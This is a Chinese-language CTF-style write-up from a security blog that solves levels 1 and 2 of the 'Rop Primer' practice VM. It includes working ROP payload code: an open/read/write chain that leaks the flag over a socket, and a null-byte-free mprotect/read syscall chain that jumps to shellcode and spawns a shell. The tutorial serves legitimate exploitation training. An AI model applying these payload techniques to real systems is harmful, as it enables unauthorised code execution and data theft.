# Pwn靶机实战——Rop Primer入门ROP

阅读量 **455688**

|评论 **4**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-01-02 16:30:07

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t01f51d3590f1475bd0.jpg)

## 0x00 前言

大家好，最近在复习关于Linux
Pwn的相关知识。偶然间看到[大佬的文章](https://www.anquanke.com/post/id/168739)，讲解了关于[Rop
Primer靶机](https://pan.baidu.com/s/1rYDOK-EDZDEfEYk2_IfRMg)中 **level0**
的解题流程，发现此靶机还有 **level1** 和 **level2** 两个练习，本着求知若渴的学习态度，研究了一下这两个练习，希望跟大家共同学习提高。

## 0x01 Rop上手：顺藤摸瓜的 level1

###  0x00 文件分析

首先，根据题目提示，以账号 **level1** 和密码 **shodan** 登录靶机，查看到文件 **flag** 和 **level1** 相关信息。

![](https://p2.ssl.qhimg.com/t01637accf832d88685.png)

**level1** 为动态链接的32位程序，开启了NX保护。

上来直接运行 **level** 程序，发现一直提示 **error bind()ing** ，ltrace看一下发现 **bind** 一直返回
-1，说明地址绑定不成功。

![](https://p4.ssl.qhimg.com/t0141e3644ded7d856d.png)

查看一下本地的端口和进程信息，发现8888端口一直处于监听状态，且属于level2用户。

![](https://p1.ssl.qhimg.com/t0169eada4120761664.png)

直接nc过去，猜测该端口上运行着一个属于 **level2** 用户的 **level1** 程序。

![](https://p2.ssl.qhimg.com/t01b68ad71151b86621.png)

再来看题目本身，通过题目的说明，根据程序源代码找到漏洞点：漏洞产生的原因为对 `char filename[32]` 执行了以下操作，而变量
`filesize` 由用户输入，因此会造成溢出。

![](https://p1.ssl.qhimg.com/t0176a091ce7bc88b55.png)

出题者提示通过 **level1** 二进制文件中的 **open/read/write** 函数来拿到flag。顺藤摸瓜，这里很自然想到处理流程为

  1. 计算偏移量，溢出
  2. 执行open，打开flag文件
  3. read读取flag文件内容
  4. write将flag写出

###  0x01 Rop准备工作

计算溢出偏移量，通过gdb调试，算得其偏移量为 **64** 字节

![](https://p0.ssl.qhimg.com/t0152e17994054b140d.png)

（注：此处如果通过ida查看到 **filename** 处于 **ebp – 0x3c** 的位置，推算要控制的 **eip** 偏移为
**0x3c+4=44** 个字节，是不准确的。）

![](https://p0.ssl.qhimg.com/t017ea60ccee346492c.png)

继续下面的工作，首先找到 **level1** **plt** 表中的 **open/read/write** 的地址：

![](https://p2.ssl.qhimg.com/t01467ede6bbfd27cd0.png)

然后，找到 **level1** 中的 **flag** 字符串：

![](https://p5.ssl.qhimg.com/t015c956f64e3d13ffb.png)

最后，收集 **level1** 中的 gadget：

![](https://p5.ssl.qhimg.com/t01af937c51447f1b2a.png)

至此，完成rop准备工作，各变量如下：

    
    
    open_addr     = 0x80486d0
    read_addr     = 0x8048640
    write_addr    = 0x8048700
    flag_addr     = 0x8049128
    pop3_ret_addr = 0x08048ef6
    pop2_ret_addr = 0x08048ef7
    buf_addr     = 0x0804a000
    

###  0x02 布局payload拿flag

**open/read/write** 函数的执行流程如下：

    
    
    open("flag",0)
    read(file_fd,buf_addr,0x80)
    write(socket_fd,buf_addr,0x80)
    

做到这里，小小的困惑了一下，Unix/Linux的一种重要思想就是一切皆文件，而这里的 **file_fd** 和 **socket_fd**
数值应该是多少？既然不清楚，那就跟踪调试看一下。这里直接上 **strace** 工具，从下图可以观察到 file_descriptor 数值为 3 ，
socket_descriptor 数值为 4 .

![](https://p5.ssl.qhimg.com/t01b838d28453101068.png)

接着布局payload如下：

    
    
    # open("flag",0)
    payload = "A"*64 
    payload += p32(open_addr)
    payload += p32(pop2_ret_addr)
    payload += p32(flag_addr)
    payload += p32(0)
    # read(file_fd,buf_addr,0x80)
    payload += p32(read_addr)
    payload += p32(pop3_ret_addr)
    payload += p32(3) # file_fd
    payload += p32(buf_addr)
    payload += p32(0x80)
    # write(socket_fd,buf_addr，0x80)
    payload += p32(write_addr)
    payload += "BBBB"
    payload += p32(4) # socket_fd
    payload += p32(buf_addr)
    payload += p32(0x80)
    

最后，通过交互，成功拿到flag。

    
    
    p = remote("192.168.88.135",8888)
    p.recvuntil("> ")
    p.sendline("store")
    p.recvuntil("> ")
    p.sendline(str(len(payload)+1))
    p.recvuntil("> ")
    p.sendline("payload")
    p.recvuntil("> ")
    p.sendline(payload)
    print p.recvline()
    

![](https://p4.ssl.qhimg.com/t01d92d90fe4508d696.png)

## 0x02 Rop提高:no null byte 的 level2

###  0x00 文件分析

同理，以 **level2** 和 **tryharder** 登录靶机，

查看文件信息。level2 为静态链接文件，开了NX保护。

![](https://p3.ssl.qhimg.com/t0139ee6b9f852cd55e.png)

查看题目说明，显然 **strcpy** 操作会导致变量 **name** 溢出，gdb调试查看溢出偏移为 **44** 个字节。

![](https://p1.ssl.qhimg.com/t0188a2b74a7f5991dd.png)

此题需要注意的是，由于是 **strcpy** 函数，在拷贝时会以 **0x00** 字节为结束符。这就提示我们，当我们打入的 payload 中间含有
**0x00** 字符时，其后的 payload 则不会顺利拷贝，从而导致无法正常执行获取shell 。

![](https://p5.ssl.qhimg.com/t014d4fcfae111c4785.png)

解题思路：参考[大佬的文章](https://www.anquanke.com/post/id/168739)中解 **level0**
的mprotect和read相配合的思想。

  1. 修改数据段权限
  2. 读入精心构造的shell，
  3. 跳转到shell处执行。

注意，由于 **0x00** 的约束， **level0** 直接调用函数的解题方式无法奏效，因此此题采用系统调用（`int
0x80`）的方式来实现第一步和第二步的操作。根据提示，我们可以通过 [ropshell网站](http://www.ropshell.com/)
来搜索二进制文件内我们所需的gadget。

###  0x01 sys_mprotect 修改 .data 权限

查看 **sys_mprotect** 信息

![](https://p3.ssl.qhimg.com/t012e8577fbe8393325.png)

由此，我们要布局的 payload 应完成如下的功能

    
    
    edx = 0x7
    ecx = 0x40
    ebx = 0x80ca000
    eax = 0x7d
    

实现 `edx=0x7` 的思想：在栈上放 **0xffffffff** ，而后 `pop edx`，再通过8次 `inc edx`即可。

网站查询到所需的gadget如下：

![](https://p0.ssl.qhimg.com/t0108f685935083aba1.png)

![](https://p2.ssl.qhimg.com/t014cfa85c7282d3e18.png)

实现 `edx=0x7` 的payload布局如下：

    
    
    payload1 += pack(0x0000a476) #pop edx ; ret
    payload1 += p32(0xffffffff) 
    payload1 += pack(0x00006da1) #inc edx; add al, 0x83; ret
    payload1 += pack(0x00006da1)
    payload1 += pack(0x00006da1)
    payload1 += pack(0x00006da1)
    payload1 += pack(0x00006da1)
    payload1 += pack(0x00006da1)
    payload1 += pack(0x00006da1)
    payload1 += pack(0x00006da1)
    

实现 `ecx=0x40` 的思想同上即可。所需的gadget信息如下：

![](https://p5.ssl.qhimg.com/t01c8d7a9c9b0416fbd.png)

![](https://p0.ssl.qhimg.com/t01e1483e07c869da9a.png)

实现 `ecx=0x40` 的payload布局如下：

    
    
    payload1 += pack(0x0000a49d)# pop ecx; pop ebx; ret
    payload1 += p32(0xffffffff) # ecx
    payload1 += p32(0x80ca001)  # 0x804a000+1 -> ebx
    
    payload1 += pack(0x000806db) #inc ecx; ret
    payload1 += pack(0x000806db) 
    payload1 += pack(0x0004fd5a) #add ecx, ecx; ret
    payload1 += pack(0x0004fd5a)
    payload1 += pack(0x0004fd5a)
    payload1 += pack(0x0004fd5a)
    payload1 += pack(0x0004fd5a)
    payload1 += pack(0x0004fd5a)
    

为实现`ebx = 0x80ca000`的操作，上述gadget已完成 **0x80ca001 pop - > ebx**
,只需再执行一次下面的gadget即可：

![](https://p3.ssl.qhimg.com/t01cf549f5199c86830.png)

    
    
    payload1 += pack(0x00007871) #dec ebx; ret
    

实现 `eax=0x7d` 同样可利用 `pop ; inc ; dec` 组合操作实现

    
    
    payload1 += pack(0x000601d6) #pop eax; ret
    payload1 += p32(0xffffffff)
    payload1 += pack(0x0002321e) #add eax, ecx; ret
    payload1 += pack(0x0002321e) 
    payload1 += pack(0x000600c6) #dec eax; ret
    payload1 += pack(0x000600c6)
    

至此，通过 `int 0x80` 即可实现 **sys_mprotect** 操作。

###  0x02 sys_read 实现读取 shellcode

整体流程同上，首先查看 **sys_read** 信息，

![](https://p0.ssl.qhimg.com/t01d95d58b14bc53289.png)

由此，我们要布局的 payload 应完成如下的功能

    
    
    edx = 0x01010101 # not 0x00
    ecx = 0x80ca000
    ebx = 0
    eax = 0x3
    

利用ropshell网站查询所需gadget，整体流程同 **0x02章节** ，在此不再赘述。payload布局如下：

    
    
    #2-1 edx <- 0x01010101
    payload1 += p32(0x08052476) #pop edx ; ret
    payload1 += p32(0x01010101) 
    
    #2-2 ecx <- 0x080ca000
    payload1 += pack(0x0000a49d) # pop ecx; pop ebx; ret
    payload1 += p32(0x80ca001)
    payload1 += p32(0xffffffff)
    payload1 += pack(0x000008e9) # dec ecx; ret
    
    #2-3 ebx <- 0
    payload1 += pack(0x000806d1) # inc ebx; ret
    
    #2-4 eax <- 0x3
    payload1 += pack(0x000601d6) # pop eax; ret
    payload1 += p32(0xffffffff)
    payload1 += pack(0x000222ef) # inc eax; ret
    payload1 += pack(0x000222ef)
    payload1 += pack(0x000222ef)
    payload1 += pack(0x000222ef)
    
    payload1 += pack(0x0000aba0) # int 0x80; ret
    

###  0x03 跳转到shellcode 执行拿flag

上述两步执行完成后，读取shellcode存储在 **0x80ca000** 处，即 **sys_read** 执行完的 **ecx** 地址处，因此在
**payload** 的最后，加上如下gadget即可。

    
    
    payload1 += pack(0x0005e42c) # jmp ecx
    

payload 保存到 payload.txt。

shellcode 直接通过 pwntools 的 `asm(shellcraft.i386.linux.sh())`
直接生成，保存到shellcode.txt。

成功溢出获得shell，拿到flag.

![](https://p1.ssl.qhimg.com/t01c68a70745adf23ed.png)

## 0x04 结束语

对pwn靶机的练习，回顾了一下rop的几种操作。当然，复杂的情况还有很多，针对具体问题也要具体分析，但总之，掌握了其核心关键的知识要点，复杂的情况只要耐心细致地分析即可。以后会继续给大家带来。  
祝大家学习工作顺利，盼和大家共同进步。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **_vige** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/168988](/post/id/168988)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [渗透测试](/tag/渗透测试)
  * [ROP](/tag/ROP)
  * [靶机](/tag/靶机)

 **+1** __9赞

 __收藏

![](https://tvax2.sinaimg.cn/crop.0.0.512.512.180/ac111bb8ly8fwun6z07nbj20e80e8aag.jpg)
_vige

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

